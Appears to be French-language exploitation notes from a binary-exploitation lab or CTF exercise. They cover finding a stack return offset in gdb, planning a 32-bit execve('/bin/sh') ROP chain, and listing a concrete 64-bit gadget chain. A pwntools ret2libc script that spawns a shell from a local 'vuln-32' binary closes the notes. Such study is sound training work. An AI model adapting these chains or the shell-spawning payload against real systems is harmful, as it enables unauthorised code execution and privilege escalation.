#1 trouver l'offset pour le premier return :
python3 -c 'print(b"000A000B000C000D000E000F000G000H000I000J000K000L000M000N")' > input.bin
gdb ./ropchain_32
# (gdb) disas main
# (gdb) disas ???
# (gdb) b* ???
# (gdb) run < input.bin
# (gdb) info frame
# > saved eip = ??? -> eip car on est en 32 bits


#2 execve(”/bin/sh”,0,0)

# pour créer un exploit qui résiste aux protections, 
# on va écrire "/bin/sh" dans une zone fixe, ensuite on gardera le pointeur vers /bin/sh en tête
#on récupère les gadgets suivants :

#- pop eax; % mettre 0xB dedans → 11=execve
#- pop ebx; % mettre l’adresse de “/bin/sh” dedans
#- pop ecx; % mettre 0x00
#- pop edx; % mettre 0x00
#- int 0x80; % interruption système
#- de quoi écrire "/bin/sh"

ROPgadget --binary ./ropchain_32 | grep '???'









# 64 bits :

offset
0x000000000044d2b4 → @ de pop rax
0x0000000000000071 → 113
0x00000000004016d3 → @ de pop rdi
0x00000000000004d2 → 1234
0x00000000004017e7 → @ de pop rsi
0x00000000000004d2→ 1234
0x000000000045b525 → @ de syscall;ret
0x000000000044d2b4 → @ de pop rax ; ret
0x000000000000003b → 59
0x00000000004b81a7 → @ de pop ecx → “/sh\x00” (en passant pas rcx)
0x000000000068732f → “/sh\x00”
0x00000000004016d3 → @ de pop rdi
0x00000000006c204 → @.bss +4 → ne marche pas → 0x000000007ffde9f5f004
0x00000000004225e9 → @ de mov 
0x00000000004b81a7 → @ de pop ecx → “/bin” (en passant pas rcx)
0x000000006e69622f → “/bin”
0x00000000004016d3 → @ de pop rdi
0x00000000006c200 →@.bss → ne marche pas → 0x000000007ffde9f5f000
0x00000000004225e9 → @ de mov 
0x00000000004017e7 → @ de pop rsi
0x0000000000000000 → 0
0x0000000000437205 → @ de pop rdx
0x0000000000000000 → 0
0x000000000045b525 → @ de syscall


from pwn import *
p = process('./vuln-32')
libc_base = 0xf7dc2000
system = libc_base + 0x44f00
binsh = libc_base + 0x18c32b
payload = b'A' * 76 + p32(system) + p32(0x0) + p32(binsh) 
p.sendline(payload)